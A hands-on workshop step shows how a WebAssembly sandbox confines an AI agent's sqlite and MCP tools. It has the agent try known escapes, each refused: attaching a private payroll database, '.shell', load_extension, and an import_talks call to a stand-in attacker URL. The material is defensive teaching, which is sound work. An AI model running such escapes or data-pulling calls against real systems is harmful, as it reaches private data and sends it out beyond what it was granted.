# Step 3: Give the agent sqlite, then try its escapes

**Folder:** `steps/03-sqlite`

`sqlite3` is on [GTFOBins](https://gtfobins.github.io/) for three things:
`.shell`, which starts a shell; `ATTACH`, which opens any database file on
disk; and `load_extension`, which loads native code.

The sqlite tool is the real SQLite engine with a minimal shell around it. The
engine runs your SQL as it is. The shell is the tool's own small code: it
turns `.tables` and `.schema` into SQL and answers `.shell` itself.

## Deploy

```sh
kubectl apply -f steps/03-sqlite/workloaddeployment.yaml \
  && sleep 2 && kubectl wait --for=condition=Ready \
  workloaddeployment/toolbox-agent
```

The same agent as step 2, with sqlite added (and listed with curl under
`hostInterfaces`), and an MCP client, which the last section of this step uses. Its grant:
one folder, read only, holding two databases (`main.db`, the talks, and
`rooms.db`).

```yaml
volumeMounts: [{ name: sqlite-data, mountPath: /data, readOnly: true }]
```

The host pod also has a third database, `/workshop/private-data/payroll.db`,
on its own disk. Native sqlite3 on that machine would open it. No workload is
granted that folder, and the host's `hostPaths` list doesn't allow it, so no
workload may even ask for it. See it on the host pod:

```sh
kubectl -n wasmcloud exec deploy/hostgroup-default -- ls /workshop/private-data
```

```text
payroll.db
```

## Try each command

Type each prompt into the chat at http://agent.localhost:28180.

<!-- codespaces -->
In Codespaces, run the `./ask` command under it instead.
<!-- /codespaces -->

**1. Ordinary SQL works** 

In the chat:

```chat
sqlite select title, speaker from talks where track = 'Security' order by title
```

The answer is longer than the chat shows at first. Click the tool's row to
expand it, then **Show all** to see every line.

<!-- codespaces -->
In Codespaces:

```sh
./ask "sqlite select title, speaker from talks where track = 'Security' order by title"
```
<!-- /codespaces -->

The SQLite engine reads the talks database.

**2. A dot-command works** 

In the chat:

```chat
sqlite .tables
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'sqlite .tables'
```
<!-- /codespaces -->

The tool's shell turns `.tables` into a query on SQLite's schema table.

**3. ATTACH a database inside the grant: it works**

In the chat:

```chat
sqlite attach 'file:/data/rooms.db?immutable=1' as r; select name, seats from r.rooms
```

<!-- codespaces -->
In Codespaces:

```sh
./ask "sqlite attach 'file:/data/rooms.db?immutable=1' as r; select name, seats from r.rooms"
```
<!-- /codespaces -->

The rooms come back. `?immutable=1` tells SQLite the file won't change, so it
takes no locks, which a read-only folder can't hold.

**4. ATTACH a database outside the grant: refused**

In the chat:

```chat
sqlite attach 'file:/workshop/private-data/payroll.db?immutable=1' as p; select name, salary from p.salaries
```

<!-- codespaces -->
In Codespaces:

```sh
./ask "sqlite attach 'file:/workshop/private-data/payroll.db?immutable=1' as p; select name, salary from p.salaries"
```
<!-- /codespaces -->

The same command with another path. `payroll.db` is a valid database on the
host pod's disk, but it is not in this component's filesystem, so SQLite
can't open it. The tool reports SQLite's "unable to open database" as
`access-denied`.

On your laptop, native sqlite3 attaches the same file (optional, needs
sqlite3):

```sh
sqlite3 databases/talks.db \
  "attach 'file:databases/payroll.db?immutable=1' as p; select name, salary from p.salaries"
```

**5. .shell has nothing to start** 

In the chat:

```chat
sqlite .shell id
```

<!-- codespaces -->
In Codespaces:

```sh
./ask 'sqlite .shell id'
```
<!-- /codespaces -->

The tool's own shell code answers this: "there is no shell here". That
message is the tool's choice. The reason it couldn't do otherwise is below.

**6. load_extension doesn't exist** 

In the chat:

```chat
sqlite select load_extension('/tmp/evil')
```

<!-- codespaces -->
In Codespaces:

```sh
./ask "sqlite select load_extension('/tmp/evil')"
```
<!-- /codespaces -->

"no such function": extension loading isn't compiled into this SQLite.

## The proof is the imports

The messages above come from the tool. What it can actually do comes from its
imports:

```sh
wasm-tools component wit artifacts/tool_sqlite.wasm | grep -E '^  import'
```

The list (17 lines) is clocks, streams, terminal, environment, exit and
filesystem. WASI has no interface that starts a process, and the component
doesn't import an HTTP client or socket. Even a sqlite3 with a real `.shell`
would have nothing to start, and the filesystem holds only `/data`.

## The same talks, behind a service and an MCP server

Most data doesn't sit in a file a tool can open. It sits behind a service,
and more and more often an MCP server sits in front of that service for
agents. MCP (the Model Context Protocol) is the common way to offer tools to
an agent.

`make up` already started both, next to the mock sites, as ordinary HTTP
components with grants of their own:

| Workload | What it is | Its grant |
| --- | --- | --- |
| `talks-api` ([manifest](../../mock-sites/talks-api.yaml)) | A REST service over the talks, standing in for a service a team already runs. It knows nothing about agents. | Its own folder, for its data. No hosts. |
| `talks-mcp` ([manifest](../../mock-sites/talks-mcp.yaml)) | An MCP server at `http://mcp.mock-sites.svc/mcp`. Each tool call becomes a request to the talks service. | One host: `talks.mock-sites.svc`. No folders. |

This step's agent has a fourth tool, `mcp`, an MCP client whose grant is one
host, the MCP server:

```yaml
- name: mcp
  image: …/workshop/tool-mcp:0.4.0
  localResources:
    allowedHosts: [mcp.mock-sites.svc]
```

So each hop reaches only the next one. The agent can only ask the `mcp` tool.
The `mcp` tool reaches only the MCP server. The MCP server reaches only the
talks service, and only the talks service touches the data.

**7. List the MCP server's tools**

In the chat:

```
mcp tools
```

In your terminal or Codespaces:

```sh
curl -s -H 'Host: agent.localhost' \
  http://127.0.0.1:28180/ \
  -d 'mcp tools'
```

The `mcp` tool asks the server for its tools. The server answers with four: `list_talks`, `get_talk`, `favorite_talk` and `import_talks`.

**8. Call one**

In the chat:

```
mcp call list_talks {"track":"Security"}
```

In your terminal or Codespaces:

```sh
curl -s -H 'Host: agent.localhost' \
  http://127.0.0.1:28180/ \
  -d 'mcp call list_talks {"track":"Security"}'
```

The MCP server turns the call into `GET /talks?track=Security` on the talks service, and the same talks come back as from sqlite.

**9. A write goes through the service**

In the chat:

```
mcp call favorite_talk {"id":1}
```

In your terminal or Codespaces:

```sh
curl -s -H 'Host: agent.localhost' \
  http://127.0.0.1:28180/ \
  -d 'mcp call favorite_talk {"id":1}'
```

The talks service marks the talk a favorite in its own folder. Neither the MCP server nor the agent can see that folder.

**10. Skip the MCP server: refused**

In the chat:

```
mcp --server http://talks.mock-sites.svc/talks tools
```

In your terminal or Codespaces:

```sh
curl -s -H 'Host: agent.localhost' \
  http://127.0.0.1:28180/ \
  -d 'mcp --server http://talks.mock-sites.svc/talks tools'
```

The talks service is on the network and would answer, but it isn't in the `mcp` tool's `allowedHosts`. The host refuses the request before it leaves.

**11. Talk the MCP server into fetching elsewhere: refused**

In the chat:

```
mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}
```

In your terminal or Codespaces:

```sh
curl -s -H 'Host: agent.localhost' \
  http://127.0.0.1:28180/ \
  -d 'mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}'
```

`import_talks` fetches whatever URL it is given. This one names the attacker's server, so the MCP server tries, and the host refuses it: the server's only grant is the talks service. The refusal comes back as the tool's failure, in the server's own words.

The imports say the same. The MCP server has an HTTP client and no
filesystem. The talks service has a filesystem and no HTTP client:

```sh
wasm-tools component wit artifacts/talks_mcp.wasm | grep -E '^  import wasi:(http|filesystem|sockets)'
wasm-tools component wit artifacts/talks_api.wasm | grep -E '^  import wasi:(http|filesystem|sockets)'
```

Full transcript: [`expected-output.txt`](expected-output.txt).
